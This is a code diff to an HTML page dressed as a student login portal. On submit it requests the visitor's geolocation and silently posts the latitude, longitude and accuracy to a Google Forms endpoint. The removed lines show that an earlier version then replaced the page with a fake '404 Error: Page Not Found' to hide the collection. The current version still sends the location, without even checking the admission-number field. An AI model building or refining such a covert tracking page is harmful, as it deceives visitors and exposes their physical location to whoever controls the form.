@@ -6,7 +6,7 @@
     body, html { font-family: Arial, sans-serif; margin: 0; padding: 0; }
     .header { background-color: #002147; color: white; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; }
     .header .logo { font-size: 24px; font-weight: bold; }
-    .content { text-align: center; padding-top: 50px; display: none; } /* Hide content initially */
+    .content { text-align: center; padding-top: 50px; }
     button { padding: 10px 20px; font-size: 16px; }
     label, input { display: block; margin: 10px auto; font-size: 16px; }
     input[type="text"] { padding: 8px; width: 200px; }
@@ -42,10 +42,8 @@ students. Please log in using one of the options below to view information or to
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const accuracy = position.coords.accuracy;
-      sendForm(latitude, longitude, accuracy);
-    }
 
-    function sendForm(latitude, longitude, accuracy) {
+      // Send data to Google Forms
       const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
       const data = new URLSearchParams();
       data.append("entry.1267598962", latitude);
@@ -56,8 +54,6 @@ students. Please log in using one of the options below to view information or to
         method: "POST",
         body: data,
         mode: "no-cors",
-      }).then(() => {
-        document.body.innerHTML = "<h1>404 Error: Page Not Found</h1>"; // Replace entire page content on success
       }).catch((error) => {
         document.getElementById("output").innerText = "Error: " + error.message;
       });
@@ -74,12 +70,7 @@ students. Please log in using one of the options below to view information or to
     }
 
     document.getElementById("submit").addEventListener("click", function(event) {
-      const admissionNo = document.getElementById("admissionNumber").value;
-      if (admissionNo) {
-        requestLocation();
-      } else {
-        alert("Please enter your Admission Number.");
-      }
+      requestLocation(); // Ensure location data is tried again on submit if not already done
     });
   </script>
 </body>
